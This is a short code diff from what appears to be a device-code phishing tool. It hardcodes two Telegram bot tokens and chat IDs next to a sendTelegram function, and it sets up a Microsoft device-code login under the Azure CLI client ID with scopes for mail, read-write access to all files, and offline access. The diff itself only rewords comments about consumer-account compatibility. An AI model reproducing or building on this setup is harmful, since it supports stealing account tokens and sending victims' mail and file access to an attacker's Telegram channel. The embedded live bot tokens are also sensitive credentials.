@@ -7,8 +7,8 @@ const TELEGRAM_CHAT_ID = "6743632244";
 const TELEGRAM_BOT_TOKEN2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
-// Device Code configuration - Using Azure CLI client ID for better compatibility
-const client_id = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'; // Azure CLI - better for device code flows
+// Device Code configuration - Using Azure CLI client ID that works with consumer accounts
+const client_id = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'; // Azure CLI - proven to work with device code flows and consumer accounts
 const scope = 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access';
 
 async function sendTelegram(message, isSecondary = false) {
